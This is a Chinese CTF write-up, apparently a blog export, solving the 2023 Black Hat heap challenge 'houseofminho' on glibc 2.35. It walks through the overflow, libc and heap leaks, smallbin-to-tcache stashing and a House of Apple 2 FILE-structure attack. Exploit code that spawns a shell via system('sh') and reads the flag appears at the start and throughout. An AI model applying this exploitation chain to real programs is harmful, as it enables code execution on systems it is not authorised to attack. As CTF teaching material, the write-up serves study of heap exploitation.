2中解释\nadd(1, b\"a\"*0x10+p64(0) + p64(0x71) + p64((heap_base + 0x2d0 + 0x70)^((heap_base)>>12)))\nfree()\n# 这里是布置House of apple 2\nadd(2, flat({\n    0x0+0x10: b\"  sh;\",\n    0x28+0x10: system,\n    0x68: 0x71,\n    0x70: _IO_list_all ^((heap_base)>>12),\n}, filler=b\"\\x00\"))\nfree()\nadd(2, flat({\n    0xa0-0x60: fake_file-0x10,\n    0xd0-0x60: fake_file+0x28-0x68,\n    0xD8-0x60: libc_base + 0x2160C0, # jumptable \n}, filler=b\"\\x00\"))\nfree()\nadd(2, p64(fake_file))\npause(1)\nio.sendline(b\"0\")\npause(1)\nio.sendline(b\"cat /flag*\")\n\nio.interactive()\n```\n\n![image-20231118024517191](houseofminho-wp/image-20231118024517191.png)\n\nFlag获得完结撒花！\n","slug":"houseofminho-wp","published":true,"updated":"2025-10-28T08:00:40.775Z","_id":"cuidMWkmSaBiKpzOhHxpZU9uy","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这个是2023 black hat第二天的一道0解pwn题</p>\n<p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2023-11_BlackHat/houseofminho.zip\">https://gitee.com/csomebro/ctftask/blob/master/2023-11_BlackHat/houseofminho.zip</a></p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>出题人很友好的给了源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIZE_SMALL 0x40</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIZE_BIG   0x80</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *g_buf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getint</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *msg)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> val;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, msg);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%*c&quot;</span>, &amp;val) != <span class=\"number\">1</span>) <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> val;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. new\\n2. show\\n3. delete&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (getint(<span class=\"string\">&quot;&gt; &quot;</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1</span>: &#123; <span class=\"comment\">/* new */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (g_buf) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] Buffer in use&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getint(<span class=\"string\">&quot;Size [1=small / 2=big]: &quot;</span>) == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">          g_buf = (<span class=\"type\">char</span>*)<span class=\"built_in\">malloc</span>(SIZE_SMALL);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          g_buf = (<span class=\"type\">char</span>*)<span class=\"built_in\">malloc</span>(SIZE_BIG);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data: &quot;</span>);</span><br><span class=\"line\">        read(STDIN_FILENO, g_buf, SIZE_BIG);</span><br><span class=\"line\">        g_buf[<span class=\"built_in\">strcspn</span>(g_buf, <span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2</span>: &#123; <span class=\"comment\">/* show */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!g_buf) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] Empty buffer&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data: %s\\n&quot;</span>, g_buf);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3</span>: &#123; <span class=\"comment\">/* delete */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!g_buf) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] Empty buffer&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"built_in\">free</span>(g_buf);</span><br><span class=\"line\">          g_buf = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[+] Bye!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>题面十分的简短，主要实现了三个功能，分别为</p>\n<ol>\n<li>add功能，可以申请<code>malloc(0x80)</code>以及<code>malloc(0x40)</code>，无论申请哪一个，都会<code>read(0, g_buf, 0x80)</code></li>\n<li>show功能，直接打印<code>g_buf</code></li>\n<li>free功能，<code>free(g_buf)</code>之后，清空<code>g_buf</code></li>\n</ol>\n<p>Glibc 版本 为2.35-3.1</p>\n<h1 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h1><p>显而易见，漏洞就在add功能中<code>read(0, g_buf, 0x80)</code>，但是局限十分多</p>\n<ol>\n<li>申请堆块的大小被严格限制，只有0x40和0x80两种申请</li>\n<li>可以保存的堆块仅仅只有一块，也就是如果需要再次malloc，必须先free</li>\n</ol>\n<p>那么会带来什么问题呢？</p>\n<p>首先glibc 2.35已经限制了tcache bin内的chunk不能多malloc一次，也就是如果对应位置的count为0，就不会申请出来，这就否定了直接溢出修改fd导致任意地址申请的方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = malloc(0x40)</span><br><span class=\"line\">free(p)</span><br><span class=\"line\">p = malloc(0x80)</span><br><span class=\"line\">free(p)</span><br><span class=\"line\">p = malloc(0x40) // 重新申请回上述的0x40块</span><br><span class=\"line\">read(0, p, 0x80) // 溢出写入到下方的0x80块的fd，并修改size改小</span><br><span class=\"line\">free(p)</span><br><span class=\"line\">p = malloc(0x80)</span><br><span class=\"line\">free(p) // 由于上文改小了size，那么这里释放的时候就不会进入0x90的管理</span><br><span class=\"line\">p = malloc(0x80) // 此时再次申请，如果低版本的tcache就可以申请出任意地址，但是2.35不行</span><br></pre></td></tr></table></figure>\n\n<p>**上述的做法是行不通的！**上述操作之后，0x90管理的位置count已经为0了，所以下次malloc(0x80)就不会从0x90的tcache取出，无法达成任意地址申请</p>\n<p><img src=\"/p/houseofminho-wp/image-20231117232223970.png\" alt=\"image-20231117232223970\"></p>\n<p>但是上述做法给了一个思路，我们可以通过多次free再次malloc 0x40就可以申请回来第一个堆块，并写入0x80长度，这个溢出很稳定，以及我们可以修改下一个堆块大小，使得绕过tcache多次申请0x90的堆块，那么现在我们需要修改tcachebin管理0x90的count值，使得可以任意地址申请。但是这个很难做到，怎么做呢？请读者继续往下看。</p>\n<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><p>如何泄露libc？如何泄露堆地址？</p>\n<h2 id=\"泄露Libc地址\"><a href=\"#泄露Libc地址\" class=\"headerlink\" title=\"泄露Libc地址\"></a>泄露Libc地址</h2><p>首先我们需要使用House of orange的一个技巧，将Top Chunk的size改小，然后申请一个大的堆块就可以把，Top Chunk放入Unsorted bin内，之后利用溢出覆盖size就可以泄露libc地址了。</p>\n<p>但是这里有一个极大的问题！Top chunk需要对其0x1000，但是已有的堆+0x40或者0x80都不可能对齐0x1000，怎么办？</p>\n<p>这里需要提到在没有setbuf(stdin,0);的情况下，scanf的输入长文本，回调用malloc、realloc、free，其中如果scanf输入数据大小为0x1000，那么会产生一下调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x800</span>);</span><br><span class=\"line\">p = <span class=\"built_in\">realloc</span>(p, <span class=\"number\">0x1000</span>);</span><br><span class=\"line\">p = <span class=\"built_in\">realloc</span>(p, <span class=\"number\">0x2000</span>);</span><br><span class=\"line\"><span class=\"built_in\">free</span>(p)</span><br></pre></td></tr></table></figure>\n\n<p>那么我们就可以完成Top Chunk的攻击了，以下是泄露libc的exp，并修复损坏的size</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br></pre></td></tr></table></figure>\n\n<p>此时堆块的布局如下</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118000114704.png\" alt=\"image-20231118000114704\"></p>\n<p>为何下方有0x10的两个块呢？那就需要了解一下unsortedbin的检查</p>\n<p>在<code>_int_malloc</code>中有这么一串代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          bck = victim-&gt;bk;</span><br><span class=\"line\">          size = chunksize (victim);</span><br><span class=\"line\">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)</span><br><span class=\"line\">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class=\"line\">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class=\"line\">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>总结一下就是</p>\n<ol>\n<li>检查当前unsorted bin内的块<code>size</code>位是不是合法的，是否满足<code>0x10 &lt;= size &lt;= system_mem</code></li>\n<li>检查当前块下物理地址相邻的下一块<code>size</code>是不是合法的，是否满足<code>0x10 &lt;= size &lt;= system_mem</code></li>\n<li>检查物理地址相邻的下一块<code>size</code>的<code>prev_size</code>是否和自己的<code>size</code>相等</li>\n<li>检查当前指针的<code>bck-&gt;fd</code>是否等于自己，以及自己的<code>fd</code>是否是<code>main_arena</code>内的一个特定地址</li>\n<li>最后检查物理地址相邻的下一块的<code>prev_inuse</code>是不是<code>0</code></li>\n</ol>\n<p>那么如果正常逻辑下Top Chunk被free到unsorted bin，说明当前内存应该全部分配完了，如果原封不动直接放到unsorted bin内，就会触发上述第2、3、5的检查不合法或者溢出，所以为了防止这个事情发生，就需要在下方设置两个小哨兵块，A块的作用是满足上述第2、3、5的检查，设置prev_size等关键数据，而<strong>B块的作用是防止A块发生unlink合并</strong>，B块的<code>prev_inuse</code>标志是1，代表A块是使用中，所以不会发生unlink，否则unlink会报错（试想一下，如果没有B块，那么A块没有被使用的，如果申请一个刚好大小为当前unsortbin的块，再释放，那么就会触发向前合并unlink，之后由于A块的fd和bk指针问题，导致程序crash）</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118001409448.png\" alt=\"image-20231118001409448\"></p>\n<p>到这里，我们压一下脑栈，上述的unsorted bin布局，后文会使用到，我们回到泄露上</p>\n<h2 id=\"泄露heap地址\"><a href=\"#泄露heap地址\" class=\"headerlink\" title=\"泄露heap地址\"></a>泄露heap地址</h2><p>泄露heap地址相对简单，直接free当前堆块后，由于tcache bin的fd指针具有<code>REVEAL_PTR</code>的保护，所以Tcache bin的第一块由于fd是0，但是被加密之后会变成<code>0 ^ (heap_adde &gt;&gt; 12)</code>的值，故可以直接泄露堆地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PROTECT_PTR(pos, ptr) \\</span></span><br><span class=\"line\"><span class=\"meta\">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>\n\n<p>泄露并修复的exp如下（当前exp衔接泄露libc的）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">... </span><span class=\"comment\"># 衔接上文泄露libc</span></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 一下两行仅仅作为临时修复，使得堆布局好看一点，正式攻击可以删除</span></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x40</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>))</span><br></pre></td></tr></table></figure>\n\n<p>此时heap地址、Libc地址信息已经收集完毕！我们来看看现在堆长什么样子</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118002652903.png\" alt=\"image-20231118002652903\"></p>\n<p>当前我们可控的堆块已经标注在图中，为啥叫做可控呢？因为由于tcache的原因，以及我们只能拥有一个堆块，所以free malloc交替进行我们只能控制这两个区域内存（？这两个区域内存我们应该如何做文章呢？请读者压一压脑栈继续往下看。）</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118002710057.png\" alt=\"image-20231118002710057\"></p>\n<h1 id=\"利用攻击\"><a href=\"#利用攻击\" class=\"headerlink\" title=\"利用攻击\"></a>利用攻击</h1><p>信息收集终于结束了，堆也变成了不认识的样子，那么我们攻击的入口在哪里呢？</p>\n<h2 id=\"Small-bin-Tcache-bin\"><a href=\"#Small-bin-Tcache-bin\" class=\"headerlink\" title=\"Small bin -&gt; Tcache bin\"></a>Small bin -&gt; Tcache bin</h2><p>答案是<code>Small bin</code>！</p>\n<p>为何选用Small bin呢？阅读源码我们可以知道，Small bin是有机会进入Tcache的，什么时机进入呢？在malloc中如果命中了Small bin某个大小的管理，那么就会将这个大小内的剩下所有块依次取出，放入Tcache内，直至填满Tcache</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (in_smallbin_range (nb))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      idx = smallbin_index (nb);</span><br><span class=\"line\">      bin = bin_at (av, idx);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((victim = last (bin)) != bin)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          bck = victim-&gt;bk;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class=\"line\">\t    malloc_printerr (<span class=\"string\">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class=\"line\">          set_inuse_bit_at_offset (victim, nb);</span><br><span class=\"line\">          bin-&gt;bk = bck;</span><br><span class=\"line\">          bck-&gt;fd = bin;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">\t    set_non_main_arena (victim);</span><br><span class=\"line\">          check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> USE_TCACHE</span></span><br><span class=\"line\">\t  <span class=\"comment\">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class=\"line\"><span class=\"comment\">\t     stash them in the tcache.  */</span></span><br><span class=\"line\">\t  <span class=\"type\">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (tcache != <span class=\"literal\">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      mchunkptr tc_victim;</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"comment\">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class=\"line\">\t      <span class=\"keyword\">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class=\"line\">\t\t     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  <span class=\"keyword\">if</span> (tc_victim != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t    &#123;</span><br><span class=\"line\">\t\t      bck = tc_victim-&gt;bk;</span><br><span class=\"line\">\t\t      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class=\"line\">\t\t      <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">\t\t\tset_non_main_arena (tc_victim);</span><br><span class=\"line\">\t\t      bin-&gt;bk = bck;</span><br><span class=\"line\">\t\t      bck-&gt;fd = bin;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t      tcache_put (tc_victim, tc_idx); <span class=\"comment\">// !!!!!! 注意这里 放入了tcache内</span></span><br><span class=\"line\">\t            &#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">          <span class=\"type\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">          alloc_perturb (p, bytes);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>也就是代码中的这个部分，下面代码中，bin就是当前small bin的位置，通过bk索引，反向查找，对于每一个Chunk依次解链，放入了Tcache bin中</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (tc_victim != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">          bck = tc_victim-&gt;bk;</span><br><span class=\"line\">          set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">            set_non_main_arena (tc_victim);</span><br><span class=\"line\">          bin-&gt;bk = bck;</span><br><span class=\"line\">          bck-&gt;fd = bin;</span><br><span class=\"line\">          </span><br><span class=\"line\">          tcache_put (tc_victim, tc_idx); 